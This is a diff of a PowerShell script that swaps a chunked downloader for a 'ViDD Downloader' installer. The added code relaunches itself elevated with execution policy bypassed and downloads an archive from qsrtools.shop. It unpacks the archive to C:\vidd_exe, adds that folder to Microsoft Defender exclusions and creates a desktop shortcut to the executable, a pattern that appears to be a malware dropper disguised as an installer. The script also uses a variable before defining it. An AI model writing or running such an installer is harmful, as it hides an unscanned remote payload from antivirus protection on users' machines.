@@ -1,144 +1,100 @@
-# Parallel segmented downloader (fast)
-param(
-    [string]$downloadURL = "https://www.qsrtools.shop/vidd_beta.zip",
-    [string]$archiveFile = "$env:TEMP\vidd_exe.zip",
-    [int]$chunks = 8,                      # increase for more parallelism (don't set insanely high)
-    [int]$timeoutSec = 60
-)
-
-# Ensure TLS modern
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-Function Get-ContentLength {
-    param($url)
-    $req = [System.Net.WebRequest]::Create($url)
-    $req.Method = "HEAD"
-    try {
-        $resp = $req.GetResponse()
-        $len = $resp.Headers["Content-Length"]
-        $resp.Close()
-        return [int64]$len
-    } catch {
-        return $null
-    }
+# ========================================
+# ViDD Advanced Downloader Installer Script
+# ========================================
+# Relaunch in interactive PowerShell if run via pipe
+if ($Host.Name -ne 'ConsoleHost') {
+    Start-Process powershell -ArgumentList "-NoExit", "-ExecutionPolicy Bypass", "-File `"$PSCommandPath`"" -Verb RunAs
+    exit
 }
 
-Function DownloadRange {
-    param($url, $from, $to, $outPath, $timeout)
-    try {
-        $req = [System.Net.HttpWebRequest]::Create($url)
-        $req.AddRange($from, $to)
-        $req.Timeout = $timeout * 1000
-        $resp = $req.GetResponse()
-        $stream = $resp.GetResponseStream()
-        $fs = [System.IO.File]::Open($outPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
-        $buffer = New-Object byte[] 81920
-        while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
-            $fs.Write($buffer, 0, $read)
-        }
-        $fs.Close()
-        $stream.Close()
-        $resp.Close()
-        return $true
-    } catch {
-        Write-Host "Range $from-$to failed: $_"
-        return $false
-    }
+# Check for admin
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole] "Administrator"))
+{
+    Write-Host "Please run this script as Administrator."
+    exit
 }
 
-# MAIN
-$size = Get-ContentLength -url $downloadURL
-if (-not $size) {
-    Write-Host "Couldn't determine remote file size — falling back to single-stream download."
-    Invoke-WebRequest -Uri $downloadURL -OutFile $archiveFile -UseBasicParsing
-    return
+# =========================
+# Remove old folder if exists
+# =========================
+if (Test-Path $extractFolder) {
+    Write-Host "Removing old installation folder..."
+    Remove-Item -Path $extractFolder -Recurse -Force
 }
 
-Write-Host "Remote size: $size bytes"
+$downloadURL = "https://www.qsrtools.shop/vidd_beta.zip"
+$archiveFile = "$env:TEMP\vidd_beta.zip"
+$extractFolder = "C:\vidd_exe"
+$exeName = "ViDD.exe"
+$shortcutName = "ViDD Downloader.lnk"
 
-# compute ranges
-if ($chunks -gt $size) { $chunks = [int]$size }    # avoid >1-byte chunks
-$chunkSize = [math]::Floor($size / $chunks)
-$tempParts = @()
-$jobs = @()
+Write-Host "Downloading file..."
+Invoke-WebRequest -Uri $downloadURL -OutFile $archiveFile -UseBasicParsing
 
-for ($i = 0; $i -lt $chunks; $i++) {
-    $start = $i * $chunkSize
-    if ($i -eq ($chunks - 1)) {
-        $end = $size - 1
+Write-Host "Downloaded file size:"
+(Get-Item $archiveFile).length
+
+# Create extraction folder if it doesn't exist
+If (!(Test-Path $extractFolder)) {
+    New-Item -ItemType Directory -Path $extractFolder | Out-Null
+}
+
+# Check header
+$headerBytes = Get-Content -Path $archiveFile -Encoding Byte -TotalCount 4
+$header = ($headerBytes | ForEach-Object { $_.ToString("X2") }) -join ""
+
+Write-Host "File header: $header"
+
+if ($header -eq "52617221") {
+    Write-Host "Detected RAR archive."
+
+    # Check WinRAR
+    $winrar = "${env:ProgramFiles}\WinRAR\WinRAR.exe"
+    if (!(Test-Path $winrar)) { $winrar = "${env:ProgramFiles(x86)}\WinRAR\WinRAR.exe" }
+
+    if (Test-Path $winrar) {
+        & $winrar x -o+ $archiveFile "$extractFolder\"
     } else {
-        $end = (($i + 1) * $chunkSize) - 1
-    }
-    $partFile = "$env:TEMP\vidd_part_$i.part"
-    if (Test-Path $partFile) { Remove-Item $partFile -Force }
-    $tempParts += $partFile
-
-    # Start background job for each part
-    $scriptBlock = {
-        param($u,$s,$e,$p,$t)
-        # call the DownloadRange function in the job scope
-        Function DownloadRangeLocal {
-            param($url, $from, $to, $outPath, $timeout)
-            try {
-                $req = [System.Net.HttpWebRequest]::Create($url)
-                $req.AddRange($from, $to)
-                $req.Timeout = $timeout * 1000
-                $resp = $req.GetResponse()
-                $stream = $resp.GetResponseStream()
-                $fs = [System.IO.File]::Open($outPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
-                $buffer = New-Object byte[] 81920
-                while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
-                    $fs.Write($buffer, 0, $read)
-                }
-                $fs.Close()
-                $stream.Close()
-                $resp.Close()
-                return $true
-            } catch {
-                Write-Host "Range $from-$to failed in job: $_"
-                return $false
-            }
-        }
-        DownloadRangeLocal -url $u -from $s -to $e -outPath $p -timeout $t
+        Write-Host "WinRAR not found. Cannot extract RAR."
+        exit
     }
 
-    $jobs += Start-Job -ScriptBlock $scriptBlock -ArgumentList @($downloadURL, $start, $end, $partFile, $timeoutSec)
-}
-
-# Wait
-Write-Host "Waiting for $($jobs.Count) download jobs..."
-$allOk = $true
-Receive-Job -Job $jobs -Keep -ErrorAction SilentlyContinue | Out-Null
-Wait-Job -Job $jobs
-
-foreach ($j in $jobs) {
-    $res = Receive-Job -Job $j -ErrorAction SilentlyContinue
-    if (-not $res) {
-        $allOk = $false
+} elseif ($header -eq "504B0304") {
+    Write-Host "Detected ZIP archive."
+    Try {
+        Expand-Archive -Path $archiveFile -DestinationPath $extractFolder -Force -ErrorAction Stop
     }
-    Remove-Job -Job $j -Force
-}
-
-if (-not $allOk) {
-    Write-Host "One or more parts failed — falling back to single-stream download."
-    if (Test-Path $archiveFile) { Remove-Item $archiveFile -Force }
-    Invoke-WebRequest -Uri $downloadURL -OutFile $archiveFile -UseBasicParsing
-    return
-}
-
-# Combine
-Write-Host "Combining parts..."
-if (Test-Path $archiveFile) { Remove-Item $archiveFile -Force }
-$fsOut = [System.IO.File]::Open($archiveFile, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
-foreach ($p in $tempParts) {
-    $fsIn = [System.IO.File]::OpenRead($p)
-    $buffer = New-Object byte[] 81920
-    while (($read = $fsIn.Read($buffer, 0, $buffer.Length)) -gt 0) {
-        $fsOut.Write($buffer, 0, $read)
+    Catch {
+        Write-Host "Extraction failed."
+        exit
     }
-    $fsIn.Close()
-    Remove-Item $p -Force
+} else {
+    Write-Host "Unknown file type. Extraction aborted."
+    exit
 }
-$fsOut.Close()
 
-Write-Host "Downloaded to $archiveFile"
+# Use extraction folder directly
+$finalFolder = $extractFolder
+Write-Host "Using final folder path: $finalFolder"
+
+# Add to Defender exclusion
+Write-Host "Adding folder to Defender exclusions..."
+Add-MpPreference -ExclusionPath $finalFolder
+
+# Create desktop shortcut directly to run.exe
+Write-Host "Creating desktop shortcut..."
+$WshShell = New-Object -ComObject WScript.Shell
+$desktopPath = [Environment]::GetFolderPath("Desktop")
+$shortcut = $WshShell.CreateShortcut("$desktopPath\$shortcutName")
+$shortcut.TargetPath = "$finalFolder\$exeName"
+$shortcut.WorkingDirectory = $finalFolder
+$shortcut.IconLocation = "$finalFolder\$exeName"  # Keep original EXE icon
+$shortcut.WindowStyle = 1  # Normal window
+$shortcut.Save()
+
+Write-Host "Done!"
+if ($Host.Name -eq 'ConsoleHost') {
+    Read-Host -Prompt "Press Enter to exit"
+} else {
+    Start-Sleep -Seconds 10
+}
